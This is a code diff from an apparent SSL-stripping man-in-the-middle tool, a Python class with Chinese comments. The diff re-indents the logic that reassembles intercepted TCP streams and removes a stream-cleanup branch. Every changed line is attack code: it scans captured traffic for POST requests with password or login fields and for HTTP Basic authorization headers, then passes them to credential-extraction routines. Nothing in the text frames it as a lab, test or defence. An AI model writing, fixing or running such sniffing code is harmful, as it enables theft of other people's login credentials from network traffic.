@@ -77,46 +77,40 @@ class SSLStripper:
                 tcp_streams[stream_id] += load
                 
                 # 檢查是否包含完整的HTTP請求
-                        try:
-                            full_data = tcp_streams[stream_id].decode('utf-8', errors='ignore')
-                            
-                            # 檢查是否包含HTTP請求結束標記
-                            if '\r\n\r\n' in full_data or len(tcp_streams[stream_id]) > 4096:
-                                # 調試輸出：顯示檢測到的HTTP請求
-                                if 'POST' in full_data:
-                                    print(f"[DEBUG] 檢測到POST請求 (長度: {len(full_data)})")
-                                    if 'password' in full_data.lower() or 'login' in full_data.lower():
-                                        print(f"[DEBUG] POST請求包含登入相關欄位")
-                                
-                                # 捕獲POST請求中的憑證
-                                if 'POST' in full_data and ('password' in full_data.lower() or 'login' in full_data.lower() or 'passwd' in full_data.lower()):
-                                    print(f"[+] 嘗試提取憑證...")
-                                    self._extract_credentials(full_data, packet)
-                                
-                                # 捕獲HTTP基本認證
-                                if 'Authorization:' in full_data and 'Basic' in full_data:
-                                    print(f"[+] 嘗試提取基本認證...")
-                                    self._extract_basic_auth(full_data, packet)
-                                
-                                # 清理已處理的流（保留最近的一些）
-                                if len(tcp_streams) > 100:
-                                    oldest = min(tcp_streams.keys(), key=lambda k: len(tcp_streams[k]))
-                                    del tcp_streams[oldest]
-                        except Exception as decode_error:
-                            # 如果解碼失敗，嘗試直接處理單個資料包
-                            try:
-                                load_str = load.decode('utf-8', errors='ignore')
-                                if 'POST' in load_str and ('password' in load_str.lower() or 'login' in load_str.lower()):
-                                    print(f"[DEBUG] 直接處理單個資料包中的POST請求")
-                                    self._extract_credentials(load_str, packet)
-                            except:
-                                pass
-                else:
-                    # 沒有Raw層，可能是ACK或其他控制包，清理對應的流
-                    if stream_id in tcp_streams and len(tcp_streams[stream_id]) > 0:
-                        # 如果流太長且沒有新資料，清理它
-                        if len(tcp_streams) > 50:
-                            del tcp_streams[stream_id]
+                try:
+                    full_data = tcp_streams[stream_id].decode('utf-8', errors='ignore')
+                    
+                    # 檢查是否包含HTTP請求結束標記
+                    if '\r\n\r\n' in full_data or len(tcp_streams[stream_id]) > 4096:
+                        # 調試輸出：顯示檢測到的HTTP請求
+                        if 'POST' in full_data:
+                            print(f"[DEBUG] 檢測到POST請求 (長度: {len(full_data)})")
+                            if 'password' in full_data.lower() or 'login' in full_data.lower():
+                                print(f"[DEBUG] POST請求包含登入相關欄位")
+                        
+                        # 捕獲POST請求中的憑證
+                        if 'POST' in full_data and ('password' in full_data.lower() or 'login' in full_data.lower() or 'passwd' in full_data.lower()):
+                            print(f"[+] 嘗試提取憑證...")
+                            self._extract_credentials(full_data, packet)
+                        
+                        # 捕獲HTTP基本認證
+                        if 'Authorization:' in full_data and 'Basic' in full_data:
+                            print(f"[+] 嘗試提取基本認證...")
+                            self._extract_basic_auth(full_data, packet)
+                        
+                        # 清理已處理的流（保留最近的一些）
+                        if len(tcp_streams) > 100:
+                            oldest = min(tcp_streams.keys(), key=lambda k: len(tcp_streams[k]))
+                            del tcp_streams[oldest]
+                except Exception as decode_error:
+                    # 如果解碼失敗，嘗試直接處理單個資料包
+                    try:
+                        load_str = load.decode('utf-8', errors='ignore')
+                        if 'POST' in load_str and ('password' in load_str.lower() or 'login' in load_str.lower()):
+                            print(f"[DEBUG] 直接處理單個資料包中的POST請求")
+                            self._extract_credentials(load_str, packet)
+                    except:
+                        pass
             except Exception as e:
                 # 輸出錯誤以便調試
                 if self.stripping:  # 只在運行時輸出
